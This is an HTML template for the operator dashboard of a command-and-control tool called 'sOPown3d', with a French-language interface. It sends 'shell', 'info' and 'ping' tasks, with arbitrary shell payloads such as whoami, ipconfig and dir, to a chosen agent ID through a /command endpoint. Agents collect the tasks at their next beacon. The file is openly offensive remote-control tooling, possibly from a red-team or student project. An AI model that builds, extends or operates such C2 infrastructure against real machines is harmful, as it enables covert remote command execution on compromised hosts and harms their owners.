<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial;
            margin: 40px;
            background: #1a1a1a;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #2d2d2d;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
        h1 { color: #4CAF50; }
        .agent-id {
            background: #3d3d3d;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            margin: 10px 0;
        }
        .command-box {
            background: #3d3d3d;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
        }
        input, select, button {
            padding: 10px;
            margin: 5px;
            border: none;
            border-radius: 5px;
        }
        input {
            width: 300px;
            background: #4d4d4d;
            color: white;
        }
        select {
            background: #4d4d4d;
            color: white;
            width: 150px;
        }
        button {
            background: #4CAF50;
            color: white;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background: #45a049;
        }
        #response {
            background: #3d3d3d;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            font-family: monospace;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>‚ö° sOPown3d - Dashboard</h1>
    <h3>üì° Send a command</h3>
    <div class="agent-id">
        <label>Agent ID:</label>
        <input type="text" id="agentId" placeholder="Ex: {{.DefaultAgent}}" value="{{.DefaultAgent}}">
    </div>

    <div class="command-box">
        <label>Commande:</label>
        <select id="commandSelect" onchange="updatePayload()">
            <option value="shell">shell</option>
            <option value="info">info</option>
            <option value="ping">ping</option>
        </select>

        <br><br>

        <label>Payload:</label>
        <input type="text" id="payload" placeholder="Commande √† ex√©cuter" value="whoami">

        <br><br>

        <button onclick="sendCommand()">üöÄ Envoyer la commande</button>
    </div>

    <div id="response">En attente...</div>

    <h3>üìã Commandes de test:</h3>
    <button onclick="testCommand('whoami')">whoami</button>
    <button onclick="testCommand('ipconfig')">ipconfig</button>
    <button onclick="testCommand('dir')">dir</button>
    <button onclick="testCommand('ping')">ping</button>
</div>

<script>
    function updatePayload() {
        const cmd = document.getElementById('commandSelect').value;
        const payloadInput = document.getElementById('payload');

        if (cmd === 'shell') {
            payloadInput.value = 'whoami';
            payloadInput.placeholder = 'Commande √† ex√©cuter';
        } else if (cmd === 'info') {
            payloadInput.value = '';
            payloadInput.placeholder = 'Pas de payload pour info';
        } else if (cmd === 'ping') {
            payloadInput.value = '';
            payloadInput.placeholder = 'Pas de payload pour ping';
        }
    }

    function testCommand(cmd) {
        document.getElementById('commandSelect').value = 'shell';
        document.getElementById('payload').value = cmd;
        sendCommand();
    }

    async function sendCommand() {
        const agentId = document.getElementById('agentId').value;
        const action = document.getElementById('commandSelect').value;
        const payload = document.getElementById('payload').value;

        if (!agentId) {
            alert('Entrez un Agent ID');
            return;
        }

        const responseDiv = document.getElementById('response');
        responseDiv.innerHTML = 'Envoi en cours...';

        try {
            const response = await fetch('/command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    id: agentId,
                    action: action,
                    payload: payload
                })
            });

            const result = await response.json();
            responseDiv.innerHTML = '‚úÖ Commande envoy√©e avec succ√®s!\n\n' +
                'Agent: ' + agentId + '\n' +
                'Action: ' + action + '\n' +
                'Payload: ' + payload + '\n\n' +
                'L\'agent r√©cup√©rera la commande au prochain beacon.';

        } catch (error) {
            responseDiv.innerHTML = '‚ùå Erreur: ' + error;
        }
    }

    document.getElementById('agentId').focus();
</script>
</body>
</html>
